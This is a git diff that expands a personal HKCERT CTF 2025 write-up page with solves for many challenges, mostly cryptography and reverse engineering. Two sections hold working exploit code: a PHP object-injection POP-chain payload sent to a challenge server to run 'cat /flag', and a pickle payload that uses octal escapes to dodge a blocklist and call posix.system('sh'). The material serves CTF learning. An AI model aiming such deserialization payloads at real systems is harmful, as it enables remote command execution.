@@ -1,17 +1,19 @@
 ---
-title: "HKCERT CTF 2025 Writeup"
-description: "My HKCERT CTF 2025 writeup collection, starting with the renderme web exploitation challenge."
+title: "HKCERT CTF 2025 — Writeup"
+description: "My HKCERT CTF 2025 writeups: renderme web RCE and privesc, plus crypto (cruel_rsa, EC Fun, Loss N, Bivariate copper, Triple Key Cipher), misc pickle jail, reverse (easyjar SM4, findkey), and a PHP POP-chain web bug."
 date: 2026-03-17T00:40:00+0800
-lastmod: 2026-06-08T23:17:00+0800
-tag: "CTF, HKCERT CTF, Web Exploitation"
+lastmod: 2026-08-06T01:10:38+0800
+tag: "CTF, HKCERT CTF, Web Exploitation, Cryptography, Reverse Engineering"
 lang: en-US
 ---
 
 # Introduction
 
-This page is for my HKCERT CTF 2025 writeups. Right now I only have time to write up `renderme` first, and I will add the other challenges later when I cleanup my PC file ... XDD
+This page collects my HKCERT CTF 2025 writeups. `renderme` came first, and I have since added the rest from my saved solve scripts.
 
-~~呢條友好懶,完左咁耐都未寫返篇 writeup 出黎~~
+~~呢條友好懶,完左咁耐先寫返啲 writeup 出黎~~
+
+A note on flags: I wrote these up from the solve scripts I kept, and some of those scripts did not record the final flag string. Where that is the case I say so rather than guess. The method is what matters, and each script is reproducible against the original challenge.
 
 ## renderme
 
@@ -248,3 +250,231 @@ The main lesson here is the same as always, after getting a shell, do not rush b
 
 - [GTFOBins - choom](https://gtfobins.github.io/gtfobins/choom/#suid)
 - [Synacktiv - PHP filters chain](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
+
+## r
+
+`r` is a PHP object-injection challenge. The entry point unserializes attacker input into a `RequestHandler`, and the trick is chaining two handlers so the anonymous-class instance is reused by reference.
+
+### The POP chain
+
+The payload builds two `RequestHandler` objects in an array. The first constructs an anonymous class whose file path points at `index.php`, and the second reuses that same object through a serialization back-reference (`r:3`), calling its `execute` method with the `cmd` parameter. The back-reference is what makes the object act as both the constructed handler and the executed one.
+
+```python
+import requests
+
+url = "http://web-dc19f6392b.challenge.xctf.org.cn/"
+
+def try_pwn(line):
+    path = f"/var/www/html/index.php:{line}$0"
+    anon_name = f"\x00class@anonymous{path}"
+    name_len = len(anon_name)
+
+    payload = (
+        'a:2:{'
+        'i:0;O:14:"RequestHandler":2:{'
+        f's:9:"processor";O:{name_len}:"{anon_name}":1:{{s:6:"handle";N;}}'
+        's:6:"action";a:2:{i:0;r:3;i:1;s:11:"__construct";}'
+        '}'
+        'i:1;O:14:"RequestHandler":2:{'
+        's:9:"processor";r:3;'
+        's:6:"action";a:2:{i:0;r:3;i:1;s:7:"execute";}'
+        '}'
+        '}'
+    )
+    r = requests.get(url, params={'p': payload, 'cmd': 'cat /flag'})
+    return "flag{" in r.text
+
+for l in [10, 6, 11, 9, 5]:
+    if try_pwn(l):
+        break
+```
+
+The unknown is the line number inside `index.php` where the anonymous class resolves, so the script sweeps a few likely values. The root cause is the usual one: never `unserialize` untrusted input when POP gadgets exist in scope.
+
+## easyJail (Miscellaneous)
+
+A Python pickle jail. The server blocks certain tokens with an `if token in data` substring check over the raw payload, so `os`, `sys`, and `set` can never appear literally.
+
+### Bypassing the substring filter with octal escapes
+
+Pickle string opcodes accept octal escapes, so the banned words can be spelled without their literal bytes ever appearing. The payload pushes `logging.root`, builds `posix.system` via `STACK_GLOBAL`, and calls it through `__setstate__`:
+
+```python
+import base64
+
+# Octal escapes so "os", "sys", "set" never appear in the raw bytes
+setstate_hex = b"S'\\137\\137\\163\\145\\164\\163\\164\\141\\164\\145\\137\\137'\n"
+posix_hex    = b"S'\\160\\157\\163\\151\\170'\n"
+system_hex   = b"S'\\163\\171\\163\\164\\145\\155'\n"
+
+payload = (
+    b"clogging\nroot\n"
+    b"("
+    + setstate_hex
+    + posix_hex
+    + system_hex
+    + b"\x93"          # STACK_GLOBAL: posix.system
+    b"d"               # DICT: {"__setstate__": posix.system}
+    b"b"               # BUILD: logging.root.__setstate__({...})
+    b"S'sh'\n"
+    b"b"               # BUILD: posix.system('sh')
+    b"."
+)
+print(base64.b64encode(payload).decode())
+```
+
+The lesson is that a substring blocklist over serialized data is not a sandbox. Pickle is code execution by design, and its escapes defeat naive filters.
+
+## cruel_rsa (Cryptography)
+
+An RSA variant where the primes have a shared structure (`p = 2ga + 1`, `q = 2gb + 1`) and the challenge leaks the top and bottom bits of the private exponent `d`. This is a partial-key-exposure attack.
+
+### Approach
+
+`d` is reconstructed as `d = dm * 2^209 + x * 2^74 + dl`, leaving 135 unknown middle bits. The solve sets up the RSA key relation `e*d = 1 + k*L` and uses a lattice/Coppersmith small-root search over the unknown middle, combined with recovering the shared factor `g` (a Blum prime around 226 bits). Once `d` is complete, the message decrypts directly.
+
+```python
+nbit = 512
+kbit  = int(nbit * 0.51)   # 261
+msbit = int(nbit * 0.103)  # 52  (top bits known)
+lsbit = int(nbit * 0.145)  # 74  (bottom bits known)
+
+shift_high = kbit - msbit  # 209
+unknown_bits = shift_high - lsbit  # 135
+# d = dm << 209 + x << 74 + dl, solve x via Coppersmith, then decrypt.
+```
+
+The full Sage script (lattice construction and factoring) is the artifact for this one. The flag was not recorded in my saved script.
+
+## EC Fun (Cryptography)
+
+A custom group disguised as rational maps over `F_p`. `have` is the group law and `fun` is a doubling-style map, together implementing scalar multiplication of a hidden 54-bit key. The goal is a discrete log.
+
+### Approach
+
+The key is only 54 bits, so a meet-in-the-middle baby-step giant-step over the custom group recovers it, using the map's own operations for the steps. Once the key is known, it is the AES key for the flag ciphertext.
+
+```python
+def scalar_mult(point, k):
+    res = g1
+    temp = point
+    while k:
+        if k & 1:
+            res = have(res, temp)
+        temp = fun(temp)
+        k >>= 1
+    return res
+
+# BSGS over the custom group to recover the 54-bit key, then AES-ECB decrypt.
+```
+
+The takeaway is that dressing up a group as opaque polynomial fractions does not raise the discrete-log difficulty when the exponent is only 54 bits. The flag was not recorded in my saved script.
+
+## Loss N (Cryptography)
+
+RSA where you are given `c`, `d`, and `e` but not the modulus `n`. The primes are consecutive (`q = next_prime(p)`), so they are close.
+
+### Recovering n from d
+
+Since `e*d - 1 = k*phi(n)`, iterate small `k`, take `phi_n = (e*d - 1)/k`, and because `p` and `q` are adjacent, `p ≈ sqrt(phi_n)`. Search a small window around that square root for a prime `p` whose `(p-1)(q-1)` matches `phi_n`, then rebuild `n` and decrypt.
+
+```python
+ed_minus_1 = e * d - 1
+for k in range(1, 100000):
+    if ed_minus_1 % k:
+        continue
+    phi_n = ed_minus_1 // k
+    p_approx = isqrt(phi_n)
+    for offset in range(-5000, 5000):
+        p = p_approx + offset
+        if not is_prime(p):
+            continue
+        q = next_prime(p)
+        if (p - 1) * (q - 1) == phi_n:
+            n = p * q
+            # decrypt pow(c, d, n)
+```
+
+Missing `n` is not much protection when `d` is known and the primes are consecutive. The flag was not recorded in my saved script.
+
+## Bivariate copper (Cryptography)
+
+An RSA challenge with a tiny factor plus a bivariate Coppersmith relation over two leaked, partially known values.
+
+### Approach
+
+`N` has a small factor, so trial division up to `2^25` splits it and the message decrypts by normal RSA. The remaining structure is two equations in unknowns `x1`, `x2` that are small (bounded by `2^244`), recovered by searching small `x1` and solving for a valid `x2` under the bound.
+
+```python
+for candidate_q in range(2, 2**25):
+    if N % candidate_q == 0 and isPrime(candidate_q) and isPrime(N // candidate_q):
+        q, p = candidate_q, N // candidate_q
+        break
+d = inverse(e, (p - 1) * (q - 1))
+# message = pow(c, d, N); then solve the bivariate relation for the small roots.
+```
+
+A small factor makes `N` splittable outright, which undercuts the whole scheme. The flag was not recorded in my saved script.
+
+## Triple Key Cipher (Cryptography)
+
+A remote encryption oracle built on a custom byte cipher with a per-byte leak. The C source `triKeyEnc.c` describes the round, and the attack is an oracle recovery using modular inverses mod 256.
+
+### Approach
+
+The `hash_msg` step truncates and SHA-256s the input, and the cipher mixes bytes with operations invertible mod 256. Querying the oracle with chosen messages and reading the leak lets you invert the key bytes one at a time via the modular inverse.
+
+```python
+def mod_inverse(a, m=256):
+    a = (a % m + m) % m
+    def egcd(a, b):
+        if a == 0:
+            return b, 0, 1
+        g, x1, y1 = egcd(b % a, a)
+        return g, y1 - (b // a) * x1, x1
+    _, x, _ = egcd(a, m)
+    return x % m
+# Query oracle, read per-byte leak, invert key bytes mod 256.
+```
+
+Byte operations that are invertible mod 256, plus a per-byte leak, give a clean oracle attack. The full pwntools client is the artifact. The flag was not recorded in my saved script.
+
+## easyjar (Reverse Engineering)
+
+A Java jar that encrypts the flag with a hand-rolled **SM4** implementation (`Sm4.class`). SM4 is a standard block cipher, so the whole thing is reversible once you port the S-box and key schedule out of the decompiled class.
+
+### Reimplementing SM4 to decrypt
+
+The solve reconstructs SM4 from the `Sm4.java` constants: the S-box (converted from signed Java bytes), the `FK` and `CK` schedule constants, and a modified `SBOX_P` built in the class's static block with an `0xA7` tweak and a per-index rotate. With the cipher rebuilt, decrypting is running SM4 in reverse.
+
+```python
+SBOX = [b & 0xFF for b in SBOX_RAW]           # signed -> unsigned
+SBOX_P = [rotl8(SBOX[(i ^ 0xA7) & 0xFF], i & 3) for i in range(256)]
+
+def tau(n):
+    return (sbox_transform((n >> 24) & 0xFF) << 24
+            | sbox_transform((n >> 16) & 0xFF) << 16
+            | sbox_transform((n >> 8) & 0xFF) << 8
+            | sbox_transform(n & 0xFF))
+
+def T(n):
+    t = tau(n)
+    return t ^ rotl(t, 2) ^ rotl(t, 10) ^ rotl(t, 18) ^ rotl(t, 24)
+```
+
+A custom SM4 is still SM4. Port the constants faithfully and the key schedule inverts. The flag was not recorded in my saved script.
+
+## findkey (Reverse Engineering)
+
+A small binary that stores its strings XOR-encoded with a few single-byte keys.
+
+### XOR key recovery
+
+Three keys show up in the binary (`0x0B` for the prompt, `0x02` for the error, `0x21` for the success message). Decoding each suspicious string with its key reveals the plaintext, and a hidden 16-byte block gives the key material for the flag.
+
+```python
+def multi_xor_decode(s):
+    return {hex(k): "".join(chr(ord(c) ^ k) for c in s) for k in (0x0B, 0x02, 0x21)}
+```
+
+Single-byte XOR over stored strings is trivially recoverable once the keys are read out of the binary. Note this is an AIS3-format challenge (`AIS3{...}`) that appeared in the set; the recovered inner value was `278-362-75136019`.
